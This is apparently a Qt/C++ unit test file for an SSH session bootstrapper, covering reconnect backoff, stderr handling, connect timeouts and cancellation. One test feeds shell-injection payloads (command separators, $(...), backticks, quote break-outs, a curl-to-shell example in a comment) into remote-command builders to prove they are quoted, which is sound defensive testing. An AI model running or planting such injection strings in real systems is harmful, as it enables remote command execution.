// Opting out of the cap keeps the ladder alive at its last rung instead of
// escalating or giving up.
void TstSessionBootstrap::uncappedLadderKeepsRetryingAtSixty()
{
    Harness h;
    h.boot.setMaxReconnectAttempts(0);
    QVERIFY(h.wire());

    QList<int> delays;
    connect(&h.boot, &SessionBootstrap::reconnectScheduled, this,
            [&](int, int delaySeconds) { delays.append(delaySeconds); });

    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();

    QTRY_VERIFY(delays.size() >= 14);
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QCOMPARE(delays.mid(5, 9), QList<int>(9, 60));
    h.boot.setReconnectEnabled(false);  // stop the ladder before teardown
}

// ---------------------------------------------------------------------------
// Channel news classification.
//
// An SSH exec channel has exactly one stderr and the remote process writes
// whatever it likes to it, so SshChannelDevice::channelError() carries ordinary
// startup chatter. codeharbor-bridge opens with
//
//   codeharbor-bridge listening on /run/user/1000/codeharbor.sock
//
// on every launch. That used to be forwarded to SessionBootstrap::error(),
// which AppController shows to the user VERBATIM in a toast — so a session that
// had just come up perfectly greeted the user with error toasts announcing its
// own success. The stream is still published (it is the only explanation the
// remote side ever gives) but as a diagnostic, never as a verdict.
// ---------------------------------------------------------------------------

void TstSessionBootstrap::remoteStderrIsDiagnosticNotError()
{
    Harness h;
    QVERIFY(h.wire());

    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);

    auto* agent = static_cast<FakeChannel*>(h.boot.agentDevice());
    agent->writeStderr(
        QStringLiteral("codeharbor-bridge listening on "
                       "/run/user/1000/codeharbor.sock\n"));

    // Published as diagnostics, trimmed, tagged with the channel it came from.
    QCOMPARE(diagSpy.size(), 1);
    QCOMPARE(diagSpy.at(0).at(0).toString(), QStringLiteral("codeharbor-bridge"));
    QCOMPARE(diagSpy.at(0).at(1).toString(),
             QStringLiteral("codeharbor-bridge listening on "
                            "/run/user/1000/codeharbor.sock"));

    // And NOT as a failure: no toast, and the session is untouched.
    QVERIFY2(errorSpy.isEmpty(),
             qPrintable(QStringLiteral("routine remote stderr was reported to "
                                       "the user as an error: %1")
                            .arg(errorSpy.value(0).value(0).toString())));
    QVERIFY(stateSpy.isEmpty());
    QCOMPARE(h.boot.state(), State::Wired);
    QVERIFY(!h.boot.reconnectPending());

    // Same on the RPC channel, and a blank line is not even worth reporting.
    h.boot.rpcChannel()->writeStderr(QStringLiteral("  \n"));
    QCOMPARE(diagSpy.size(), 1);
    QVERIFY(errorSpy.isEmpty());

    // The channel really dying is still a loss, still an error, still a
    // reconnect — stderr is what stops being a verdict, not EOF.
    agent->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("codeharbor-bridge channel closed")));
}

// The other half of the contract: demoting stderr must not make a channel that
// genuinely fails to start go quiet. A user whose remote node path is wrong
// still has to be told.
void TstSessionBootstrap::genuineChannelSetupFailureStillErrors()
{
    Harness h;
    h.boot.channelsOk = false;  // openChannelDevice() hands back nothing
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());

    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("could not start codeharbord over SSH")));
    QCOMPARE(h.boot.state(), State::Failed);
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);

    // The SECOND channel open failing is its own path: the codeharbord device
    // is already wired to the client by then, so the failure has to unwire it
    // again rather than leave a half-connected session behind.
    Harness agentFailure;
    agentFailure.boot.agentChannelOk = false;
    QSignalSpy agentErrors(&agentFailure.boot, &SessionBootstrap::error);
    QVERIFY(!agentFailure.wire());
    QCOMPARE(agentErrors.size(), 1);
    QVERIFY2(agentErrors.at(0).at(0).toString().contains(
                 QStringLiteral("could not start codeharbor-bridge over SSH")),
             qPrintable(agentErrors.at(0).at(0).toString()));
    QCOMPARE(agentFailure.boot.state(), State::Failed);
    QVERIFY(agentFailure.boot.rpcDevice() == nullptr);
    QVERIFY(agentFailure.boot.agentDevice() == nullptr);
    QVERIFY(agentFailure.client.transport() == nullptr);
    QVERIFY(agentFailure.monitor.transport() == nullptr);

    // A pool that refuses the connection outright is reported too, and the
    // diagnosis the pool emitted while failing is carried into that report
    // (withLastPoolError) instead of leaving the user a bare "failed".
    Harness dead;
    dead.boot.connectOk = false;
    dead.boot.poolFailureMessage = QStringLiteral("authentication rejected");
    QSignalSpy deadErrors(&dead.boot, &SessionBootstrap::error);
    QVERIFY(!dead.wire());
    QCOMPARE(deadErrors.size(), 1);
    const QString deadMessage = deadErrors.at(0).at(0).toString();
    QVERIFY2(deadMessage.contains(QStringLiteral("failed")), qPrintable(deadMessage));
    QVERIFY2(deadMessage.contains(QStringLiteral("authentication rejected")),
             qPrintable(deadMessage));
}

// ---------------------------------------------------------------------------
// Connect stall and GUI responsiveness.
//
// Measured on this machine with the pre-flight DISABLED (setConnectTimeoutMs(0)
// hands the stall back to libssh), all of it on the calling thread:
//
//   reachable fixture 127.0.0.1:2222   ~77 ms   ok
//   closed port       127.0.0.1:<free>  ~0 ms   "Connection refused"
//   mute TCP peer     127.0.0.1:<mute> 10016 ms "Timeout connecting to ..."
//   black-holed IP    10.255.255.1:22  10006 ms "Timeout connecting to ..."
//
// Ten seconds of a frozen window per attempt, repeated once per rung of the
// reconnect ladder. The cases below pin the bound that replaces it, and — more
// importantly than the number — that the event loop keeps turning while it
// runs. They use real sockets on loopback and a 120 ms budget, so the whole
// block costs a fraction of a second.
//
// The budget is a TEST-CHOSEN number (setConnectTimeoutMs is production API,
// not a test seam bolted on), so it is compressed as far as the assertions
// allow: this is a DEFAULT-suite target and nothing here may spend real wall
// clock waiting for a remote endpoint. The only cases that name a large budget
// are the two cancellation ones, and they exist precisely to prove the budget
// is NEVER waited out — they fail by taking that long.
// ---------------------------------------------------------------------------

namespace {
constexpr int kProbeBudgetMs = 120;
// Generous ceiling: the assertion is "bounded", not "fast to the millisecond",
// and a loaded CI box must not turn a real bound into a flake.
constexpr int kProbeCeilingMs = 3000;
constexpr int kProbeRefusalSlackMs = 100;
// A refused TCP connect can report one scheduler tick after the requested
// timeout on Windows; keep the assertion tight without making that boundary
// a platform-specific failure.
} // namespace

// A port nobody is listening on is refused by the kernel at once: no wait, no
// libssh, State::Failed, and nothing left attached to the consumers.
void TstSessionBootstrap::refusedEndpointFailsFastAndCleanly()
{
    Harness h;
    h.useRealProbeAgainst(refusedPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();
    qInfo() << "refused endpoint: connectAndWire blocked" << elapsed << "ms";
    QVERIFY2(elapsed < kProbeBudgetMs + kProbeRefusalSlackMs,
             qPrintable(QStringLiteral("refusal took %1 ms (limit %2 ms)")
                            .arg(elapsed)
                            .arg(kProbeBudgetMs + kProbeRefusalSlackMs)));
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 0);  // libssh was never entered
    QCOMPARE(errorSpy.size(), 1);
    const QString message = errorSpy.at(0).at(0).toString();
    QVERIFY(message.contains(QStringLiteral("cannot reach"))
            || message.contains(QStringLiteral("did not answer")));
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.boot.agentDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(!h.boot.reconnectPending());
}

// The expensive case: TCP comes up and the peer then says nothing. libssh
// charges a flat ten seconds for this; the pre-flight charges what we asked
// for, and still ends in a clean Failed with nothing half-wired.
void TstSessionBootstrap::muteEndpointIsBoundedByConnectTimeout()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();

    qInfo() << "mute endpoint: connectAndWire blocked" << elapsed
            << "ms for a" << kProbeBudgetMs << "ms budget";
    QCOMPARE(server.accepted, 1);  // the TCP connection really was established
    QVERIFY2(elapsed >= kProbeBudgetMs,
             "returned before the budget: the probe cannot have waited");
    QVERIFY2(elapsed < kProbeCeilingMs,
             qPrintable(QStringLiteral("mute endpoint stalled %1 ms").arg(elapsed)));
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 0);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("did not answer within")));
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);

    // And the measured cost is reported through the production accessor, not
    // only by this test's stopwatch.
    QVERIFY(h.boot.lastAttemptMs() >= kProbeBudgetMs);
}

// The point of the whole exercise. A blocking wait (waitForConnected() or
// libssh) starves the event loop: no repaints, no timers, a grey window. The
// pre-flight must let the loop keep turning while it waits.
void TstSessionBootstrap::probeKeepsTheEventLoopRunning()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);

    int ticks = 0;
    QTimer heartbeat;
    // Fast enough that a compressed budget still yields a decisive count.
    heartbeat.setInterval(10);
    connect(&heartbeat, &QTimer::timeout, this, [&ticks] { ++ticks; });
    heartbeat.start();

    QVERIFY(!h.wire());
    heartbeat.stop();

    qInfo() << "event-loop ticks during a" << kProbeBudgetMs
            << "ms probe:" << ticks;
    // A 120 ms stall at 10 ms per tick is ~12; anything above a handful proves
    // the loop ran. Zero is what a blocking wait scores.
    QVERIFY2(ticks >= 5,
             qPrintable(QStringLiteral("only %1 timer ticks: the event loop "
                                       "was starved")
                            .arg(ticks)));
}

// The nested event loop is only safe if it cannot be re-entered. A second
// connect request arriving mid-probe must be refused, not allowed to rewrite
// the target of the attempt already in flight.
void TstSessionBootstrap::reentrantConnectDuringProbeIsRefused()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);

    bool secondReturned = false;
    bool secondResult = true;
    // Comfortably inside the budget, so the re-entrant call lands while the
    // pre-flight is genuinely parked rather than after it has unwound.
    QTimer::singleShot(30, &h.boot, [&] {
        secondResult = h.boot.connectAndWire(QStringLiteral("127.0.0.1"), 22,
                                             QStringLiteral("other"),
                                             QStringLiteral("/usr/bin/node"),
                                             QStringLiteral("/srv/other"));
        secondReturned = true;
    });

    QVERIFY(!h.wire());

    QVERIFY2(secondReturned, "the re-entrant call never ran inside the probe");
    QVERIFY(!secondResult);
    QCOMPARE(server.accepted, 1);  // the refused call opened no second socket
    QCOMPARE(h.boot.probeCalls, 1);
    QCOMPARE(h.boot.state(), State::Failed);
}

// Reconnect-storm cost. With the endpoint dark, every rung of the ladder used
// to pay libssh's full connect stall on the GUI thread — ten rungs, ten
// freezes. The pre-flight has to short-circuit before connectPool() on EVERY
// attempt, not just the first.
void TstSessionBootstrap::darkEndpointNeverReachesTheBlockingHandshake()
{
    Harness h;
    QVERIFY(h.wire());  // comes up once

    h.boot.probeOk = false;  // and the endpoint goes dark
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.probeCalls, 11);   // the original wire plus ten retries
    QCOMPARE(h.boot.connectCalls, 1);  // ...and libssh was entered only once
    QVERIFY(errorSpy.at(1).at(0).toString().contains(
        QStringLiteral("endpoint is dark")));
}

// Reconnect-storm cost, measured end to end against a real socket. Every rung
// of the ladder pays one connect budget and no more: the stall per retry is
// bounded and does not compound, and libssh is never entered at all.
void TstSessionBootstrap::ladderPaysOneBudgetPerRung()
{
    ProbeServer server;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    // Pure sleeping proves nothing HERE — the schedule itself is pinned by
    // backoffLadderMatchesSpec()/retryDelaySequenceAndCap() — so the rungs are
    // compressed hard and the connect budget is left as the dominant term,
    // which is the only thing this case measures.
    h.boot.setReconnectTimeScale(0.01);  // 1 s rung -> 10 ms
    h.boot.setMaxReconnectAttempts(3);

    QVERIFY(h.wire());  // the server answers, so the wire succeeds
    QCOMPARE(h.boot.probeCalls, 1);

    server.mute = true;  // now it goes quiet: every retry burns the full budget
    QElapsedTimer clock;
    clock.start();
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE_WITH_TIMEOUT(h.boot.state(), State::Failed, 20000);
    const qint64 elapsed = clock.elapsed();

    // Rungs 1, 2 and 5 s scaled by 0.01 = 80 ms of waiting, plus one connect
    // budget per attempt.
    const qint64 ladderMs = 80 + 3 * kProbeBudgetMs;
    qInfo() << "three dark rungs took" << elapsed << "ms (budget"
            << kProbeBudgetMs << "ms/attempt, ladder floor" << ladderMs << "ms)";
    QCOMPARE(h.boot.probeCalls, 4);    // the initial wire plus three retries
    QCOMPARE(h.boot.connectCalls, 1);  // libssh entered only for the live one
    QVERIFY2(elapsed < ladderMs * 3,
             qPrintable(QStringLiteral("ladder cost %1 ms against a %2 ms "
                                       "floor: the stall is compounding")
                            .arg(elapsed)
                            .arg(ladderMs)));
    QVERIFY(!h.boot.reconnectPending());
}

// The freeze the user can actually get out of. disconnectSession() called from
// the event loop WHILE a connect is stalled in its pre-flight must cut the wait
// short instead of running out the budget, and must leave the session down —
// not Failed, and certainly not wired a moment later.
void TstSessionBootstrap::disconnectDuringProbeCutsTheWaitShort()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    // Deliberately long: the case fails by TAKING this long, not by asserting a
    // flag.
    h.boot.setConnectTimeoutMs(10000);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QTimer::singleShot(40, &h.boot, [&h] { h.boot.disconnectSession(); });

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();

    qInfo() << "disconnect during a 10000 ms pre-flight unblocked after"
            << elapsed << "ms";
    QVERIFY2(elapsed < 2000,
             qPrintable(QStringLiteral("cancel took %1 ms: the wait was not "
                                       "interruptible")
                            .arg(elapsed)));
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 0);
    QVERIFY(!h.boot.reconnectPending());
    // A cancellation the user asked for is not an error to shout about.
    QCOMPARE(errorSpy.size(), 0);

    // And it stays down: the unwinding attempt must not wire anything after.
    QTest::qWait(100);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(h.boot.rpcDevice() == nullptr);
}

// Same interruption, but on the automatic ladder: setReconnectEnabled(false)
// while a RETRY is stalled in its pre-flight stops it there, and the ladder
// does not arm another rung behind the user's back.
//
// The interruption is armed through onProbeStarted, NOT by first waiting for
// probeCalls to reach 2. That wait looks like the obvious way to catch the
// retry in its pre-flight and is the exact opposite: QTRY_COMPARE drives
// processEvents(), processEvents() dispatches the rung, the rung enters
// probeEndpoint()'s nested loop — and the QTRY does not get to re-evaluate
// anything until that loop returns. It therefore always observed a probe that
// had ALREADY run its full budget out, made the case cost a flat 10 s, and
// "cancelled" nothing: the measured unblock time was 0 ms because the stall
// was over before the stopwatch started.
void TstSessionBootstrap::disablingReconnectDuringProbeStopsTheLadder()
{
    ProbeServer server;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    // Deliberately long: the case fails by TAKING this long, not by asserting
    // a flag.
    h.boot.setConnectTimeoutMs(10000);
    h.boot.setReconnectTimeScale(0.02);  // first rung 20 ms

    QVERIFY(h.wire());  // the server answers, so the initial wire comes up
    server.mute = true;

    // Armed after the live wire, so it belongs to the RETRY's probe and to no
    // other. One-shot: a later rung would find it already spent.
    h.boot.onProbeStarted = [&h] { h.boot.setReconnectEnabled(false); };

    QElapsedTimer clock;
    clock.start();
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);

    QTRY_COMPARE_WITH_TIMEOUT(h.boot.state(), State::Disconnected, 3000);
    const qint64 elapsed = clock.elapsed();
    qInfo() << "reconnect disabled mid-pre-flight unblocked after" << elapsed
            << "ms (budget" << h.boot.connectTimeoutMs() << "ms)";

    // The load-bearing assertion. State alone cannot tell a cancelled probe
    // from one that timed out normally — setReconnectEnabled(false) reaches
    // Disconnected either way. Only the clock does: a pre-flight that ignored
    // the cancel costs the whole 10 s budget.
    QVERIFY2(elapsed < 2000,
             qPrintable(QStringLiteral("cancel took %1 ms of a %2 ms budget: "
                                       "the retry's pre-flight was not "
                                       "interruptible")
                            .arg(elapsed)
                            .arg(h.boot.connectTimeoutMs())));
    // ...and it really was a parked pre-flight that got cancelled, not a rung
    // stopped before it ever fired.
    QCOMPARE(h.boot.probeCalls, 2);

    QVERIFY(!h.boot.reconnectPending());
    QTest::qWait(150);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.probeCalls, 2);    // no further rung ran
    QCOMPARE(h.boot.connectCalls, 1);  // only the original live wire
}

// Mid-wait cancellation, measured: disconnectSession() must return at once and
// the armed rung must never fire.
void TstSessionBootstrap::disconnectMidBackoffStopsImmediately()
{
    Harness h;
    // 1 s first rung at this scale is 200 ms, long enough to interrupt.
    h.boot.setReconnectTimeScale(0.2);
    QVERIFY(h.wire());
    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.boot.reconnectPending());

    QTest::qWait(50);  // squarely inside the 200 ms wait
    QElapsedTimer clock;
    clock.start();
    h.boot.disconnectSession();
    const qint64 elapsed = clock.elapsed();

    qInfo() << "disconnectSession() mid-backoff returned in" << elapsed << "ms";
    QVERIFY2(elapsed < 50, "disconnectSession() blocked on the pending rung");
    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.reconnectAttempt(), 0);

    // The rung that was armed does not fire after the fact.
    QTest::qWait(400);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 1);
    QCOMPARE(h.boot.probeCalls, 1);
}

// The other side of disablingReconnectDuringProbeStopsTheLadder(): the switch
// governs the automatic LADDER, and a connect the user asked for themselves is
// not the ladder's to abandon.
//
// This used to strand the whole object. setReconnectEnabled(false) cancelled
// whatever attempt was in flight, including a connectAndWire() parked in its
// pre-flight; that attempt then unwound with the cancel flag set, and
// connectAndWire() deliberately does NOT relabel a cancelled attempt Failed
// (a cancel means the canceller chose the end state, which is true of
// disconnectSession() and of nothing else). So nothing ever moved the state
// off Connecting: no session, no error, no retry armed, and the connect button
// stuck on "connecting" for the rest of the run.
//
// The observable is the STATE, not the clock: a manual connect must be allowed
// to finish, pass or fail, on its own terms.
void TstSessionBootstrap::disablingReconnectDuringAUserConnectLeavesItAlone()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    // Comfortably inside the budget, so it lands while the pre-flight really is
    // parked rather than after it has unwound.
    bool toggled = false;
    QTimer::singleShot(30, &h.boot, [&] {
        h.boot.setReconnectEnabled(false);
        toggled = true;
    });

    QVERIFY(!h.wire());
    QVERIFY2(toggled, "the toggle never ran inside the pre-flight");

    // The connect ran to its own conclusion and SAID so.
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY2(errorSpy.at(0).at(0).toString().contains(
                 QStringLiteral("did not answer within")),
             qPrintable(errorSpy.at(0).at(0).toString()));
    QVERIFY(!h.boot.reconnectPending());

    // ...and the object is not wedged: the very next connect still works, which
    // a stranded m_attempting/m_cancelRequested pair would refuse.
    h.boot.realProbe = false;
    QVERIFY2(h.wire(), "a later connect was refused after the toggle");
    QCOMPARE(h.boot.state(), State::Wired);

    // Reconnect really is off, though: losing the session now leaves it down
    // rather than arming a rung.
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
}
namespace {

// A stand-in for the remote `node`: an executable that echoes its argv as
// [arg][arg]..., so a test can observe both the exact split the remote login
// shell performed and which entry point it selected. A real interpreter path
// beats rewriting the generated command after the fact — the string under test
// stays byte-for-byte the one SessionBootstrap emits, quoting included.
void writeArgvEcho(const QString& path)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile script(path);
    if (!script.open(QIODevice::WriteOnly))
        return;
    script.write("#!/bin/sh\nfor a in \"$@\"; do printf '[%s]' \"$a\"; done\n");
    script.close();
    script.setPermissions(QFileDevice::ReadOwner | QFileDevice::WriteOwner
                          | QFileDevice::ExeOwner);
}

} // namespace


// A remote process that execs fine and THEN explains itself before exiting is
// the shape of every "the server side is not installed" failure — `sh` printing
// which codeharbord entry points it looked for, node printing that a module is
// missing. That explanation used to go only to channelDiagnostic(), which has
// no consumer, so the user was handed "codeharbord channel closed" and nothing
// else. error() is the only channel that reaches them, so the loss must carry
// it — and must carry the DYING channel's words, not the other channel's
// routine startup banner.
void TstSessionBootstrap::channelLossCarriesThatChannelsLastRemoteWords()
{
    Harness h;
    QVERIFY(h.wire());
    QCOMPARE(h.boot.channels.size(), 2);

    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    // The bridge greets every launch on stderr; that is chatter, not a verdict.
    h.boot.channels.at(1)->writeStderr(
        QStringLiteral("codeharbor-bridge listening on /run/user/1000/ch.sock"));
    QCOMPARE(errorSpy.count(), 0);

    // codeharbord's own last words, then EOF.
    const QString complaint = QStringLiteral(
        "codeharbor: no codeharbord entry point on this server. Tried: "
        "/srv/codeharbor/dist/codeharbord.js, "
        "/srv/codeharbor/remote/dist/codeharbord.js, "
        "/srv/codeharbor/remote/src/codeharbord.ts");
    h.boot.channels.at(0)->writeStderr(complaint);
    h.boot.channels.at(0)->dropRemote();

    QCOMPARE(errorSpy.count(), 1);
    const QString reported = errorSpy.at(0).at(0).toString();
    QVERIFY2(reported.contains(QStringLiteral("codeharbord channel closed")),
             qPrintable(reported));
    QVERIFY2(reported.contains(complaint), qPrintable(reported));
    // The other channel's banner is NOT dragged into codeharbord's death.
    QVERIFY2(!reported.contains(QStringLiteral("listening on")),
             qPrintable(reported));
}

// SessionBootstrap::rpcCommand()/bridgeCommand() splice two ServerProfiles
// fields — nodePath and repoRoot — into a string that an SSH exec request hands
// straight to the remote LOGIN SHELL. Those fields are attacker-influenced: the
// profile store is an ini file, and a shared, synced or simply writable one
// (ServerProfiles::restrictPermissions() narrows it precisely because a
// group-writable ~/.config is the common case) lets someone else choose them.
// A nodePath of `sh -c 'curl evil|sh'` or a repoRoot carrying $(...) must be a
// broken path, never an execution.
//
// Proven against a REAL /bin/sh rather than by eyeballing the quoting: each
// payload tries to create a canary file, and the shell must refuse to make it.
void TstSessionBootstrap::remoteCommandsQuoteHostileProfileFields()
{
    const QString shell = QStandardPaths::findExecutable(QStringLiteral("sh"));
    QVERIFY2(!shell.isEmpty(), "a POSIX sh is required for this remote-command test");
    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QString canary = dir.filePath(QStringLiteral("CANARY"));
    const QString touch =
        QStringLiteral("touch ") + canary; // spliced into every payload below

    struct Case {
        const char* what;
        QString nodePath;
        QString repoRoot;
    };
    const QList<Case> cases{
        {"command separator in nodePath",
         QStringLiteral("node; ") + touch + QStringLiteral("; :"),
         QStringLiteral("/srv/repo")},
        {"command substitution in nodePath",
         QStringLiteral("$(") + touch + QStringLiteral(")node"),
         QStringLiteral("/srv/repo")},
        {"backticks in nodePath",
         QStringLiteral("`") + touch + QStringLiteral("`node"),
         QStringLiteral("/srv/repo")},
        {"sh -c payload as the whole nodePath",
         QStringLiteral("sh -c '") + touch + QStringLiteral("'"),
         QStringLiteral("/srv/repo")},
        {"quote break-out in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv'; ") + touch + QStringLiteral("; '")},
        {"command substitution in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv/$(") + touch + QStringLiteral(")x")},
        {"newline in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv\n") + touch + QStringLiteral("\nx")},
        {"boolean chain in repoRoot", QStringLiteral("/usr/bin/node"),
         QStringLiteral("/srv && ") + touch},
        {"leading dash in both", QStringLiteral("-rf"), QStringLiteral("-rf")},
    };

    for (const Case& c : cases) {
        for (const QString& command :
             {SessionBootstrap::rpcCommand(c.nodePath, c.repoRoot),
              SessionBootstrap::bridgeCommand(c.nodePath, c.repoRoot)}) {
            QFile::remove(canary);
            QProcess sh;
            sh.setWorkingDirectory(dir.path());
            sh.start(shell, {QStringLiteral("-c"), command});
            QVERIFY2(sh.waitForStarted(5000), c.what);
            sh.closeWriteChannel();
            QVERIFY2(sh.waitForFinished(15000), c.what);
            QVERIFY2(!QFileInfo::exists(canary),
                     qPrintable(QStringLiteral("%1: the remote shell EXECUTED "
                                               "the payload\ncommand: %2")
                                    .arg(QLatin1String(c.what), command)));
        }
    }

    // ...and the quoting is not achieved by mangling honest values: a path with
    // spaces still reaches the shell as ONE argument — in the interpreter AND
    // in the entry point it selects. The entry has to exist on disk now,
    // because the command picks it ON THE SERVER; see
    // remoteEntryPointsSupportBothReleaseAndCheckoutLayouts().
    const QString spacedNode = dir.filePath(QStringLiteral("my node/bin/node"));
    writeArgvEcho(spacedNode);
    const QString spacedRoot = dir.filePath(QStringLiteral("my repo"));
    const QString spacedEntry =
        spacedRoot + QStringLiteral("/remote/src/codeharbord.ts");
    QVERIFY(QDir().mkpath(QFileInfo(spacedEntry).absolutePath()));
    QFile spacedFile(spacedEntry);
    QVERIFY(spacedFile.open(QIODevice::WriteOnly));
    spacedFile.close();

    QProcess argv;
    argv.setWorkingDirectory(dir.path());
    argv.start(shell, {QStringLiteral("-c"),
                       SessionBootstrap::rpcCommand(spacedNode, spacedRoot)});
    QVERIFY(argv.waitForFinished(15000));
    QCOMPARE(QString::fromUtf8(argv.readAllStandardOutput()),
             QStringLiteral("[%1][rpc][--stdio]").arg(spacedEntry));
}

// The client must be able to launch BOTH remote layouts, because it is the only
// thing that gets to decide which one it can talk to. rpcCommand()/
// bridgeCommand() used to hardcode <root>/remote/src/*.ts, so the client
// required a full git checkout AND remote node >= 23.6 type-stripping — and the
// release artifact codeharbor-remote.tar.gz (dist + package.json + sql,
// .github/workflows/release.yml) was something nothing could consume.
//
// Selection happens ON THE SERVER, inside the exec we were issuing anyway: no
// extra round trip per connect, no per-profile field for the user to answer,
// and no window in which a client-side probe result goes stale before launch.
// Driven here through a real /bin/sh against real files, so what is asserted is
// the choice the remote login shell would actually make.
void TstSessionBootstrap::remoteEntryPointsSupportBothReleaseAndCheckoutLayouts()
{
    QTemporaryDir dir;
    const QString shell = QStandardPaths::findExecutable(QStringLiteral("sh"));
    QVERIFY2(!shell.isEmpty(), "a POSIX sh is required for this remote-command test");
    QVERIFY(dir.isValid());
    const QString root = dir.path();
    // The interpreter lives outside the candidate tree, so placing entry points
    // never disturbs it.
    const QString node = dir.filePath(QStringLiteral("bin/node"));
    writeArgvEcho(node);

    const auto place = [&root](const QString& relative) {
        const QString path = root + QLatin1Char('/') + relative;
        QDir().mkpath(QFileInfo(path).absolutePath());
        QFile file(path);
        // A value-returning lambda cannot host QVERIFY (it expands to `return;`),
        // and a fixture that cannot be created makes every later check meaningless.
        if (!file.open(QIODevice::WriteOnly))
            qFatal("could not create fixture entry point %s", qUtf8Printable(path));
        file.close();
        return path;
    };

    // Run one command exactly as the remote login shell would — no rewriting.
    // `node` is the argv echo, so the entry the shell SELECTED is observable.
    const auto choose = [&root, &shell](const QString& command, bool waitForOutput = false) {
        QProcess sh;
        sh.setWorkingDirectory(root);
        sh.start(shell, {QStringLiteral("-c"), command});
        if (waitForOutput)
            sh.waitForReadyRead(15000);
        sh.closeWriteChannel();  // releases bridgeCommand's `cat` watchdog
        sh.waitForFinished(15000);
        return QStringList{QString::fromUtf8(sh.readAllStandardOutput()),
                           QString::fromUtf8(sh.readAllStandardError())};
    };

    // (1) Nothing installed. The failure must NAME every path it tried, or
    // "it doesn't launch" is unanswerable without an SSH session of your own.
    const QStringList missing = choose(SessionBootstrap::rpcCommand(node, root));
    QVERIFY2(missing.at(0).isEmpty(), qPrintable(missing.at(0)));
    for (const QString& candidate :
         SessionBootstrap::entryCandidates(root, QStringLiteral("codeharbord"))) {
        QVERIFY2(missing.at(1).contains(candidate),
                 qPrintable(QStringLiteral("stderr did not name %1:\n%2")
                                .arg(candidate, missing.at(1))));
    }

    // (2) A plain dev checkout: TypeScript source, type-stripped by node.
    const QString src = place(QStringLiteral("remote/src/codeharbord.ts"));
